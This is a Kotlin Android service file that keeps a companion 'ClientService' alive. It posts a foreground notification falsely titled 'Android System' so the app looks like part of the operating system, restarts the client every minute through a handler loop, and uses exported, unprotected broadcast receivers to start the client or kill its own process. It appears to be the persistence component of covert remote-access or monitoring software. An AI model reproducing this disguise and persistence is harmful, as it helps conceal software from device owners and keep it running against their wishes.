package com.client.services.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.client.isMyServiceRunning

const val KILL_SELF_BROADCAST = "com.client.services.KILL_SELF"

class ClientServiceStarter : Service() {
    private val notificationChannelId = "client_starter_channel"
    private var notificationChannel: NotificationChannel? = null
    private var notificationManager: NotificationManager? = null
    private var notification: Notification? = null

    companion object {
        const val ACTION_START_CLIENT_SERVICE = "com.client.services.client.ClientServiceStarter.START_CLIENT_SERVICE"
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createClientStarterNotificationChannel(context: Context?) {
        if (notificationChannel == null) {
            notificationChannel = NotificationChannel(notificationChannelId, "ClientStarterChannel", NotificationManager.IMPORTANCE_HIGH)
            notificationManager = context?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager!!.createNotificationChannel(notificationChannel!!)
        }
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_START_CLIENT_SERVICE) {
                Intent(applicationContext, ClientService::class.java).also {
                    it.action = ClientService.Actions.START.toString()
                    applicationContext.startService(it)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_START_CLIENT_SERVICE),
                RECEIVER_EXPORTED
            )
        } else {
            registerReceiver(
                receiver,
                IntentFilter(ACTION_START_CLIENT_SERVICE)
            )
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createClientStarterNotificationChannel(this)
        notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentText("Android System is running...")
            .setContentTitle("Android System")
            .build()
        startForeground(2, notification)

        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                android.os.Process.killProcess(android.os.Process.myPid())
            }
        }
        registerReceiver(killSelfBroadcastReceiver, IntentFilter(KILL_SELF_BROADCAST), RECEIVER_EXPORTED)

        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed(
            object : Runnable {
                override fun run() {
                    if (!isMyServiceRunning(applicationContext, ClientService::class.java)) {
                        Intent(applicationContext, ClientService::class.java).also {
                            it.action = ClientService.Actions.START.toString()
                            applicationContext.startService(it)
                        }
                    }
                    handler.postDelayed(this, 1000 * 60)
                }
            },
            1000 * 60
        )
        return START_STICKY
    }
}